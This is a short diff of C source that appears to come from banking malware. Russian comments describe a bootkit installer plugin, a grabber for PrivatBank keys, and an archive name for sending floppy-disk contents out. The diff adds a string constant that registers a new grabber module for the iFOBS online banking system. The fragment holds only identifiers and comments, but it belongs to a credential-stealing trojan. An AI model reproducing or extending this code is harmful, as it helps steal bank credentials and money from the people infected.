@@ -99,6 +99,10 @@ CSSTR EStrBootkitInstaller[] = "bki.plug";
 
 //Имя систем граберов
 CSSTR EStrSystemPrivat[] = "privat"; // Грабер ключей приватбанка
+#ifdef IfobsOnlineH
+CSSTR EStrSystemIfobsOnline[] = "IfobsOnline"; // Грабер системы Ifobs онлайн
+#endif
+
 
 
 CSSTR EStrCabNameDisketa[] = "disketa"; // Имя каба для отправки флопидисков
